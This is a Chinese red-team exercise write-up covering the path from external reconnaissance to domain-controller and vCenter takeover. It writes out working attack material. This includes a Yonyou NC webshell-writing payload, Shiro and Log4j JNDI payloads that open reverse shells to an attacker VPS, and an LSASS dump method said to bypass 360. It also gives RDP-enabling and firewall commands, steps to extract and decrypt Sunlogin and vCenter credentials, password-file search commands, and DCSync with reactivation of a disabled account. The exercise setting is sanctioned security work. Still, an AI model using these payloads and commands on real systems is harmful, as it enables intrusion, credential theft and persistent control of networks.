

# 奇安信攻防社区 - 记一次攻防演练实战总结

### 记一次攻防演练实战总结

对前阵子的攻防演练比赛进行总结，分享一些个人的思路和方法

# 0x01 外网打点

## 资产发现

**多测绘平台搜索**

[https://hunter.qianxin.com/](https://hunter.qianxin.com/)  
[https://fofa.info/](https://fofa.info/)  
[https://quake.360.cn/](https://quake.360.cn/)

![image_X8BSXnkylx.png](assets/1698900866-7967b03050b2619e6bd150fcefe829ab.png)

![image_ctJSWbXB6F.png](assets/1698900866-acee3e848386b4abdedc5eedb18ec681.png)

**多语法搜索**

假如某个目标站点为 xxxx.com，我们可以通过不同的语法进行资产搜集，搜集的资产会更全面  
这里以 fofa 为例

```php
domain="xxxx.com"  
host="xxxx.com"  
header="xxxx.com"  
cert="xxxx.com"
```

## 敏感信息泄露

对于学校站点的信息搜集，一般来说外网能拿直接权限的点已经很少了，web 应用大多是放在 vpn 后面，因此能弄到一个 vpn 账号可以说是事半功倍，这时候可以通过语法对此类信息进行挖掘

常用命令如下：

```php
#google 语法  
site:*.edu.cn intext: vpn | 用户名 | 密码 | 帐号 | 默认密码  
​  
#github  
*.edu.cn password
```

![image_22dBsSWKAO.png](assets/1698900866-32e319e6ad9bcfef483906f774014132.png)

在这次攻防演练里，也是幸运找到了某站点 VPN 的默认口令，使用的是 `姓名拼音/12345678` 弱口令

![image_i-KtUIqFmy.png](assets/1698900866-2fd699fac013e4602ac3b59018665b5e.png)

## 默认口令

对于部分站点，在搭建完成后可能没有更改默认账号密码，这时候可以尝试使用默认账密登录

下面列举一些常见的 web 站点默认口令

```php
账号：  
admin administrator root user test  
​  
密码：  
admin admin123 123456 123 test root
```

对于一些应用广泛的系统，可以通过 google 语法搜索其默认密码

![image_ejxlTxW5Av.png](assets/1698900866-1f6cdab1e3c1b1865144bf4064ff02f9.png)

这里通过`sysadmin/1` 成功登入泛微后台

![t1sb-w5grl_9Xl3mB_bqn.png](assets/1698900866-f7e3c9e48b7d39182c19661c1e584153.png)

`nacos/nacos`

![image-20220723225803735.png](assets/1698900866-a1e4f108323f20896a7c4d8c9e79a1c0.png)

## 常见漏洞利用

对于多目标的攻防演练，个人比惯把目标子域 url 搜集好，去重后批量导进去指纹识别工具，如 Goby、fofahub

从指纹识别结果里筛选出重要资产进行突破，使用已知漏洞或 day 进行攻击

以下为一些批量漏洞利用工具：

[https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0](https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0)  
[https://github.com/d3ckx1/Fvuln](https://github.com/d3ckx1/Fvuln)  
[https://github.com/W01fh4cker/Serein](https://github.com/W01fh4cker/Serein)

框架类的如 log4j、shiro、struts2 等

OA 类的如致远、泛微、用友、蓝凌等，这里也是找到了目标的用友 nc 站点

### 用友 nc 写 shell

![56xk-0ba58_-A3uKrDLZX.png](assets/1698900866-c0a637aa297a41000c5b399920435e01.png)

访问接口/servlet/~ic/bsh.servlet.BshServlet 执行命令

![d5lhwsk0r8_WfpuDtbLpm.png](assets/1698900866-2a0543938e833d279d2a28fa18ecb7c9.png)

dnslog 探测了一下发现不出网，这里直接写入 webshell

1、首先生成一个哥斯拉的 jsp 木马，然后进行 unicode 编码

![image_796oyMMBO3.png](assets/1698900866-9daf44bb5de653cfdf80b5c64c26af44.png)

2、再把输出结果进行 url 编码

![image_zZUpiKMWn1.png](assets/1698900866-a1c114681bab98ba5c2535df0b514c19.png)

3、payload 字段如下，这里写入默认路径为 webapps/nc\_web，实战中灵活应变

```php
String keyWord = URLDecoder.decode("xxxxxx（填入生成内容）xxxxxx", "utf-8");    
BufferedWriter out = new BufferedWriter(new FileWriter("/webapps/nc\_web/test.jsp"));  
out.write(keyWord);  
out.close();
```

这里直接写入哥斯拉马，连接成功

![b8xw2a-s9d_hjEIes_edE.png](assets/1698900866-d81d0257c12d1ae568edf919f780ac0b.png)

### shiro 无依赖链利用

通过测绘平台找到一个比较偏的资产，直接访问是一个静态页面，但扫描目录后指纹识别一波发现是 shiro

直接使用 shiro\_attack\_2.2 工具开冲，发现有默认 key 但是无利用链

![image_ylgMY223mT.png](assets/1698900866-da3ede54148457827a3e6f95e3750b6b.png)

可能有些人看到这里就放弃了，但这可能会错过一个利用点

shiro 可以无依赖链利用，感觉有戏尝试一波，相关知识可拜读师傅的文章[https://www.le1a.com/posts/a5f4a9e3](https://www.le1a.com/posts/a5f4a9e3)

这里换用其他工具

![image-20220607115446156_b9JXMk_Qxy.png](assets/1698900866-74dc293bcf8f0bbef844bc04749c7f2e.png)

通过 dnslog 测试有回显，这里有个注意点：使用 [http://dnslog.cn/](http://dnslog.cn/ "http://dnslog.cn/") 部分站点会拦截，可以换多个 dnslog 平台测试

![image_htB_EhwPH9.png](assets/1698900866-12bdbe8febd2cd2a6df4e45115ed45b6.png)

dnslog 有回显接下来就是拿 shell 了，这里由于固定思维，之前遇到的都是 linux 系统，先入为主觉得是 Linux，结果没利用成功，一开始以为是防火墙拦截，后面探测了一下目录结构，发现是 windows，所以这里 payload 要改变一下

这里可以通过网站快速生成 payload  
[https://x.hacking8.com/java-runtime.html](https://x.hacking8.com/java-runtime.html "https://x.hacking8.com/java-runtime.html")

```php
Linux：
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 88 CommonsBeanutils1 "bash -c {echo,字段}|{base64,-d}|{bash,-i}"  
字段=bash -i >& /dev/tcp/x.x.x.x/8888 0>&1 base64后的值  
nc -lvp 端口

Windows：
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i VPS地址  
java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar ysoserial.exploit.JRMPListener 88 CommonsBeanutils2 "ldap://VPS 地址:1389/Basic/Command/Base64/d2hvYW1p"  
d2hvYW1p为命令的base64，这里是执行命令whoami
```

![image_wvD-c4KvV-.png](assets/1698900866-9ff58dac3c05944aa595013491fba0b5.png)

# 0x02 内网渗透

## 杀软识别

拿到一台机器后，一般先看一下安装了什么安全防护产品

`tasklist /svc`

![-rr-ew4zvx_bjnBTV1EhH.png](assets/1698900866-5e0cd900eb83e8a237ff3f9db542e67c.png)

探测了一下发现安装了 360，把之前准备好的 bypass360 马子扔上去，成功上线

![chm2qtadrh_QYKNvySqi7.png](assets/1698900866-a1595b9e3144a419f76d7fa4bef07ec8.png)

## 隧道搭建

ping 了一下发现机器出网，可以上 frp 搭建反向代理隧道

![7brv9u2oe7_ljYwWodDhg.png](assets/1698900866-5749c1a2b9e0bee1f746497e97345c51.png)

proxifier 配置相应的端口账密便可以进入内网

![h0a0j4rf5-_22woqcMQL4.png](assets/1698900866-71454f9e4722dde75109a8697169bc8a.png)

## 横向思路

1、优先拿运维机器，一般存放着大量的账号密码信息

2、其次是集权设备，Vcenter、堡垒机、天擎这些，有 day 上 day，没 day 寻找其他方法

3、有域的情况下，争取拿到域管 hash，或者通过已知漏洞拿下域控

## 横向移动

在扫描之前，可以先通过 netspy 筛选可达的网段再进行扫描

[https://github.com/shmilylty/netspy](https://github.com/shmilylty/netspy "https://github.com/shmilylty/netspy")

![image_aAWQmEgoLW.png](assets/1698900866-9508f10d5f8649b2207da0d8ec1b3480.png)

接着上 fscan 对可达各个 C 段开扫，追求效率可只扫描 22、80、443、445、1433、8080 等重点端口

由于扫描会引起安全设备告警，因此横向尽可能在一小时内结束，避免入口机器被关机下线，对于拿到的机器可以通过计划任务进行维权，尽可能多拿几台机器保证口子不会掉，拿到机器后继续做信息搜集，网段，机器信息，敏感文件，xshell、navicat 密码等常规的这里就不细说了

### dump lssas

正常没有杀软我们可以通过 mimikatz 抓取密码

但很多时候 mimikatz 会被拦截，这时候可以通过一些 LOLBINS 方法 dump 出来本地解

![image_xvtqu2JT5W.png](assets/1698900866-681353953370640e3572483c08ed343c.png)

这里使用的 dump64.exe 为白程序，位置位于

`C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\`

`dump64.exe pid c:\\users\\xxx\\Desktop\\out.dmp`

测试可过 360 和火绒

![image_w7zffbKEzi.png](assets/1698900866-de834111d580155c0e2537758c639c33.png)

![image_x0lqYBmjQ2.png](assets/1698900866-d9ad592ce40a243ed3c9753256984820.png)

### 密码复用

08 机器之前可以抓到明文，抓不到明文可以尝试到 cmd5 上进行破解，破解率较高

[https://www.cmd5.com](https://www.cmd5.com/)  
[https://www.somd5.com](https://www.somd5.com/)

获取密码之后可以通过超级弱口令工具进行密码复用爆破，拿着获取的密码重新组合字典，对网段内的机器进行爆破，这次也是成功拿下了几十台机器

![image_B-HbFja15K.png](assets/1698900866-0db645c4ca344b0e8fa3eced383ac014.png)

若 hash 解不出来，这时候我们可以根据开放的端口进行 PTH，下面列举一些

```php
wmiexec  135端口  
psexec   445端口  
evil-winrm   5985端口
```

### 向日葵读取密码

拿到机器的账号密码之后，若机器开启了 3389 端口可以选择 rdp 远程桌面过去，没开的话可以开启 3389 端口进行远程连接

```php
#执行以下命令操作注册表来开启机器 3389 远程桌面服务  
REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f  

#使用以下命令添加防火墙放行策略  
netsh firewall add portopening protocol = TCP port = 3389 name = rdp  
```

但如果是正常办公时间，贸然登录过去会很容易引起对方的发现，若进程中有 sunlogin 进程，可以读取识别码和验证码，通过向日葵连接相对比较隐蔽

![duk5gbct0f_meMyYaCbN7.png](assets/1698900866-5d86299fd36365501cc71b7c46f9d221.png)

注册表读取配置信息：

```php
reg query HKEY\_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo  
reg query HKEY\_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo  

向日葵默认配置文件路径:  
安装版：C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini  
便携版：C:\\ProgramData\\Oray\\SunloginClient\\config.ini  
本机验证码参数：encry\_pwd  
本机识别码参数：fastcode(去掉开头字母)  
sunlogincode：判断用户是否登录状态
```

读注册表：

![glkpzmabud_771pPqH2eN.png](assets/1698900866-18b63aebc5c4d2f57d65f966bc94107f.png)

读默认配置文件：

fastcode 去掉前面的数字 k 为本机识别码`278263893`

![0k5feqz515_ejswLYRqVy.png](assets/1698900866-dfe5f2398956c6fefe31f0d4dd4236b7.png)

使用脚本进行解密获得本机验证码

![r10bnuf1d3_sY377ayb3l.png](assets/1698900866-7f3ea9554971f02343b13353cac45dbe.png)

### 运维机

横向的时候优先拿运维机，一般运维机存储着大量的账号密码信息，比如这次无意中发现的运维机器使用的是弱口令`administrator/111111`

另外还可以通过 cs 插件查看机器历史登录 IP 对运维人员进行锁定

拿下后可通过命令行快速收集服务器、网络拓扑、密码本、公司信息等重要文件。

```php
dir /a /s /b d:\\" \*.txt"   
dir /a /s /b d:\\"\* pass \*"   
dir /a /s /b d:\\"\* login \*"   
dir /a /s /b d:\\"\* user \*"  
dir /a /s /b c:\\password.txt  
dir /a /s /b c:\\\*.conf \*.ini\* .inc\* .config   
dir /a /s /b c:\\conf.\* config.\*   
dir /a /s /b c:\\\*.txt \*.xls\* .xlsx\* .docx | findstr "拓扑"  
dir /a /s /b c:\\\*.conf \*.ini\* .inc\* .config | findstr "运维"  
dir /a /s /b c:\\\*.txt \*.xls\* .xlsx\* .docx | findstr "密码" >C:\\Users\\1.txt  
```

最后收集了一堆密码本，可登录到各重要系统：

H3C 堡垒机

![ilyp6ixpq1_a6ILzCKmfM.png](assets/1698900866-9748e434974701ef573c04d7f2864692.png)

禅道

![a680cz-6mv_TJX707htOa.png](assets/1698900866-1fda90a61b975b1949b9abec020a9f6d.png)

### 域控

1、通过 fscan 扫描的时候可以检索 AD 关键字发现域控

```php
[*]192.168.10.38 #非真实域控 ip  
   [->]D1-Prod-AD-P01  
   [->]192.168.10.38  
     
[*]192.168.10.20 #非真实域控 ip  
   [->]AD  
   [->]192.168.10.20
```

2、域内主机 DNS 一般就是域控地址

接着可以通过该机器是否开放 53 和 389 端口进行进一步确认

这次攻防演练的其中一个目标，通过密码复用爆破成功的某台机器里，刚好存在着域管进程，提权到 system 权限后注入到域管进程，通过 Dcsync 成功获取域管密码的 hash 值，其中一个被禁用的账户刚好可以通过 cmd5 解出，解出明文密码并激活账户，成功登录两台域控机器，除此以外还可以尝试域漏洞、NTLM 中继等

```php
net group "domain admins" /domain  
dcsync domain xxxx  
shell net user xxxx  
shell net user xxxx /active:yes /domain
```

![image_CbIuSx-DB0.png](assets/1698900866-b0b2c111a53f65d77853cdd16cbc6ecb.png)

![image_lKpb0bidqu.png](assets/1698900866-fb081772d9d5b4d66404ddb761600c61.png)

### Vcenter

在扫描的过程中发现几台 Vcenter，Vcenter 常规有三种打法，分别是

CVE-2021-22005-rce、CVE-2021-21972-rce 和 log4j

前两个测试没成功，log4j 通过 dnslog 探测漏洞存在，vcenter 的漏洞触发点在 xff 头部

```php
java -jar JNDIExploit-1.3-SNAPSHOT.jar -l 1389 -p 8889 -i 0.0.0.0  
nc -lvp 9000  
${jndi:ldap://VPSIP:1389/Deserialization/CommonsBeanutils1/ReverseShell/VPSIP/9000}
```

![4s6zq8tgso_dj3CuwYEQo.png](assets/1698900866-3b09076dd34e688e5471f1b6097c1329.png)

![styrmfmfl2_AgaGTkpKg8.png](assets/1698900866-f637415da5e4c9e65cdc383d46beb506.png)

但一般打完是非交互式 shell，没有回显，这里使用命令切换为交互式 shell

`python -c 'import pty;pty.spawn('/bin/bash')'`

重置密码

`/usr/lib/vmware-vmdir/bin/vdcadmintool`

**不重置密码获取密码**

[https://github.com/shmilylty/vhost\_password\_decrypt](https://github.com/shmilylty/vhost_password_decrypt "https://github.com/shmilylty/vhost_password_decrypt")

```php
#获取 vc 用户的密码  
cat /etc/vmware-vpx/vcdb.properties  
​  
#把加密后的密码单独拿出来，  
psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip\_address,user\_name,password from vpx\_host;" > password.enc  
#改成这种格式\*  
H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==\*  
zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==\*  
Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==\*  
R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==  
​  
#拿解密 key  
cat /etc/vmware-vpx/ssl/symkey.dat  
Windows：C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat  
Linux：/etc/vmware-vpx/ssl/symkey.dat  
​  
#破解  
python decrypt.py symkey.dat password.enc pass.txt
```

然后就可以登入 web 控制台了

![1r01obzkhj_ogBBaw34kH.png](assets/1698900866-97e94159b3fa764183e15cdc3199d085.png)  
![wrhrlq1_b0_FPzcE7l_qW.png](assets/1698900866-b85675a7ececaa74701b97d37efe29f3.png)

### 云管平台

通过运维机的 xshell 查找历史记录拿下了主备数据库，然后执行 sql 语句成功获取出了云管平台的 hash

![s0rd_kjpjv_87EAPEGHd4.png](assets/1698900866-b32f9f8fd90adc71ede0f466680ac07a.png)

到 cmd5 上进行解密，一块钱拿下云管平台很划算

![ju3rv8cne0_h6vf8T_VC_.png](assets/1698900866-5ebf668dd32099899827131102816c4e.png)

![gg-wo7d5y4_4dPpSzvI37.png](assets/1698900866-5d5bf844d91cc3a80d6849ef42e0101a.png)

但某些系统加密方式不是使用 md5 的，比如之前碰到的一些系统使用的是 Bcrypt 加密方式，像这种不可逆的加密方式可以通过替换 hash 进行登录

`$2a$10$z0hHT9rltH59VvcazrSzOuVDNr05shwja1aZmD8ctzDbuNNvdpNIS`

![image_jqNCTT6FpJ.png](assets/1698900866-ea409e3e9a768d5f4f32a1ef1b725c18.png)

![image_X-SfF9SMpb.png](assets/1698900866-be8d178550e2732a5076db38c1325ff4.png)

### 官网

当我们拿到集权设备后，一般里面会有靶标系统或核心系统，这些分数是很高的，这次演练某目标就是通过云管平台登录官网机器，抓取浏览器密码成功获取后台密码，成功拿下官网控制权

![0dd0amrx3g_9fOtAaJESy.png](assets/1698900866-726adba30b355e8b77e855a4710e64a2.png)

### gitlab 仓库

根据评分规则刷完路径分之后，可以根据目标性质找一些核心关键的系统跟裁判 battle，像这种存有大量代码的仓库可以作为重大成果进行提交

![j07_ng7z14_wYcVLx23dN.png](assets/1698900866-de42ea0703f86a32addb76fd4dc5231e.png)
